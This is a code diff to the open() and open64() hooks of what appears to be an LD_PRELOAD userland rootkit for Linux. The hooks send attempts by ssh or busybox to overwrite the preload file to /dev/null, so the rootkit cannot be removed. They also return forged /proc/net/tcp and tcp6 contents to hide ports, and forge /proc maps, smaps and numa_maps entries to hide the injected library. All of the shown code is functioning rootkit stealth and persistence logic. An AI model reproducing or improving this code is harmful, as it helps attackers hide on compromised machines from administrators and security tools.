@@ -4,10 +4,9 @@ int open(const char *pathname, int flags, mode_t mode){
 
 #ifdef HIDE_SELF
     if(hidden_path(pathname) && strstr(LDSO_PRELOAD, pathname) &&
-        ((process(SH_PROC) || process(BUSYBOX_PROC)) &&
+        ((process("ssh") || process("busybox")) &&
         (flags == (64|1|512)))){
-        int ret = (long)call(COPEN, DEVNULL_PATH, flags, mode);
-        return ret;
+        return (long)call(COPEN, "/dev/null", flags, mode);
     }
 #endif
 
@@ -22,7 +21,7 @@ int open(const char *pathname, int flags, mode_t mode){
      *  we can apply this to any file that a process may need to open. */
 
 #ifdef HIDE_PORTS
-    if(!strncmp(TCP_PATH, pathname, strlen(pathname)) || !strncmp(TCP6_PATH, pathname, strlen(pathname)))
+    if(!strcmp(pathname, TCP_PATH) || !strcmp(pathname, TCP6_PATH))
         return fileno(forge_procnet(pathname));
 #endif
 
@@ -33,7 +32,7 @@ int open(const char *pathname, int flags, mode_t mode){
 
     char cwd[PATH_MAX];
     if(getcwd(cwd, sizeof(cwd)) != NULL){
-        if(!strncmp(PROC_PATH, cwd, strlen(cwd))){
+        if(!strcmp(cwd, PROC_PATH)){
             if(!fnmatch(MAPS_PROC_PATH, pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
             if(!fnmatch(SMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
             if(!fnmatch(NMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
@@ -62,10 +61,9 @@ int open64(const char *pathname, int flags, mode_t mode){
 
 #ifdef HIDE_SELF
     if(hidden_path(pathname) && strstr(LDSO_PRELOAD, pathname) &&
-        ((process(SH_PROC) || process(BUSYBOX_PROC)) &&
+        ((process("ssh") || process("busybox")) &&
         (flags == (64|1|512)))){
-        int ret = (long)call(COPEN, DEVNULL_PATH, flags, mode);
-        return ret;
+        return (long)call(COPEN64, "/dev/null", flags, mode);
     }
 #endif
 
@@ -75,7 +73,7 @@ int open64(const char *pathname, int flags, mode_t mode){
     }
 
 #ifdef HIDE_PORTS
-    if(!strncmp(TCP_PATH, pathname, strlen(pathname)) || !strncmp(TCP6_PATH, pathname, strlen(pathname)))
+    if(!strcmp(pathname, TCP_PATH) || !strcmp(pathname, TCP6_PATH))
         return fileno(forge_procnet(pathname));
 #endif
 
@@ -86,7 +84,7 @@ int open64(const char *pathname, int flags, mode_t mode){
 
     char cwd[PATH_MAX];
     if(getcwd(cwd, sizeof(cwd)) != NULL){
-        if(!strncmp(PROC_PATH, cwd, strlen(cwd))){
+        if(!strcmp(cwd, PROC_PATH)){
             if(!fnmatch(MAPS_PROC_PATH, pathname, FNM_PATHNAME)) return fileno(forge_maps(pathname));
             if(!fnmatch(SMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return fileno(forge_smaps(pathname));
             if(!fnmatch(NMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
